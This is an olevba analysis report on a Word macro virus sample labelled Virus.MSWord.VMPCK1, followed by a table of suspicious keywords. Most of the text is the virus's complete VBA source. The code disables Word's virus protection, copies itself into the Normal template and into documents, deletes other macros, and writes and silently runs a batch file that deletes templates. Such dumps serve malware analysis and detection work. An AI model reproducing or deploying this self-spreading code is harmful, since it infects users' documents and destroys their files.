olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.cm-ff843c3d03d638685db687b1de03ec0541b48783
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.cm-ff843c3d03d638685db687b1de03ec0541b48783 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MAMM.bas 
in file: Virus.MSWord.VMPCK1.cm-ff843c3d03d638685db687b1de03ec0541b48783 - OLE stream: 'Macros/VBA/MAMM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, NT As Object
Sub AutoOpen()
On Error GoTo hapus
Dim NT As Object
Dockenor
Create_Loader
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "MAMM" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "MAMM" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Pad = Options.DefaultFilePath(wdDocumentsPath)
ModuleLength = Doc.VBProject.VBComponents("MAMM").CodeModule.CountOfLines
NT.Save
Doc.VBProject.VBComponents("MAMM").Export Pad + ("\document.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
MAMM
Label_Exit:
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
If NormInstall = True Then Call Create_Loader
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
If Now > DateSerial(1998, 9, 15) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="MAMM.pesen"
End
hapus:
Dockenor
End Sub
Sub Create_Loader()
On Error Resume Next
Options.DefaultFilePath(wdStartupPath) = "C:\Windows"
Options.DefaultFilePath(wdTempFilePath) = "C:\Windows\inf"
Pad1 = Options.DefaultFilePath(wdStartupPath)
MyFile = Dir(Pad1 + "\document.dot")
If MyFile = "" Then
Set aDoc = NormalTemplate.OpenAsDocument
With aDoc
    .SaveAs FileName:=Pad1 + "\document.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
End Sub
Sub MAMM()
On Error Resume Next
Norkedoc
Call Create_Loader
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False
bodo:
End Sub
Sub FileSave()
    On Error Resume Next
    Norkedoc
    ActiveDocument.Save
    MAMM
End Sub
Sub FileClose()
    On Error Resume Next
    Norkedoc
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    MAMM
ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Norkedoc
    MAMM
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileExit()
    On Error Resume Next
    Norkedoc
    MAMM
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Norkedoc
    MAMM
End Sub
Sub AutoExec()
On Error GoTo hapus
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
    Call zap("c:\windows\zap.bat")
Call sim
MAMM
WBF
AddIns.Unload False
WBF
hapus:
Dockenor
End Sub
Sub AutoClose()
    On Error Resume Next
    Norkedoc
    MAMM
End Sub
Sub ToolsMacro()
    On Error Resume Next
    MAMM
End Sub
Sub FileTemplates()
    On Error Resume Next
    MAMM
End Sub
Sub ViewVbCode()
    On Error Resume Next
    MAMM
End Sub
Sub zap(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "del c:\progra~1\micros~1\office\startup\*.dot"
Print #hFile, "del c:\progra~1\micros~1\templa~1\*.dot"
Print #hFile, "del zap.bat"
Close hFile
Shell ("c:\windows\zap.bat"), vbHide
End Sub
Sub FileOpen()
On Error Resume Next
WBT
If Dialogs(80).Show <> 0 Then
Dockenor
Norkedoc
Call MAMM
WBF
Else
WBF
End If
End Sub
Sub pesen()
SendKeys "%m%s{down}~%d'If you delete this, you have no heart MAMM'%m"
End Sub
Function Dockenor()
    On Error GoTo Erw1
    NorOk = False
    WBT
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
      NMacr = NormalTemplate.VBProject.VBComponents(i).Name
      If NMacr = "MAMM" Then NorOk = True
      If (NMacr <> "MAMM") And (NMacr <> "ThisDocument") Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If NorOk = False Then
      On Error GoTo Erh1
            Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:= _
          "MAMM", Object:=wdOrganizerObjectProjectItems
      Templates(NormalTemplate.FullName).Save
      NormalTemplate.Application.Visible = False
Erh1:
    End If
Erw1:
End Function
Function Norkedoc()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "MAMM" Then Dokok = True
      If (NMacr <> "MAMM") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "MAMM", Object:=wdOrganizerObjectProjectItems
      ActiveDocument.ReadOnlyRecommended = False
      ActiveDocument.Save
Erh2:
    End If
Erw2:
End Function
Function WBT()
WordBasic.disableautomacros True
End Function
Function WBF()
WordBasic.disableautomacros False
End Function
Function sim()
f56879025 = GetAttr(NormalTemplate.FullName)
Application.VBE.ActiveVBProject.VBComponents("MAMM").Export "c:\windows\system\vxd.sys"
If f56879025 = vbReadOnly Then GoTo bodo
If f56879025 = vbReadOnly + vbArchive Then GoTo bodo
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "MAMM" Then xxx902578112 = True
Next i
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "MAMM" Then mmf78116 = True
Next i
If xxx902578112 = True And mmf78116 = False Then Set o7811902511 = NormalTemplate.VBProject.VBComponents
If xxx902578112 = False And mmf78116 = True Then Set o7811902511 = ActiveDocument.VBProject.VBComponents
o7811902511.Import "c:\windows\system\vxd.sys"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If mmf78116 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
bodo:
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |zap.bat             |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
